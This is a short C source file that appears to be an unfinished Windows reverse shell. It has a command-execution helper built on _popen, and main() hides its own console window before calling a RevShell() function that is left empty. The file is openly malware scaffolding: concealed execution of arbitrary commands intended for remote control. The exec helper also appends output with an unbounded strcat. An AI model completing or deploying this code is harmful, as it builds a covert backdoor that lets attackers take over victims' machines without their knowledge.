//Main Headers

#include <WinSock2.h>	//Socket Connection
#include <Windows.h>	//Used for WinAPI calls
#include <WS2tcpip.h>	//TCP-IP sockets
#include <string.h>

//Input / Output 
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void exec(char* return_Val, int return_Size, const char* command)
{
	FILE* fp;
	char buffer[DEFAULT_BUFLEN];

	//Run the command and open pipe to read the output
	if ((fp = _popen(command, "r")) == NULL)
	{
		snprintf(return_Val, return_Size, "[x] Error executing command...\n");
		return;
	}

	//Read the output line by line and add it to return_Val
	while (fgets(buffer, sizeof(buffer), fp) != NULL)
	{
		strcat(return_Val, buffer);
	}

	_pclose(fp);
}

void RevShell()
{

}

int main()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	RevShell();
	return 0;
}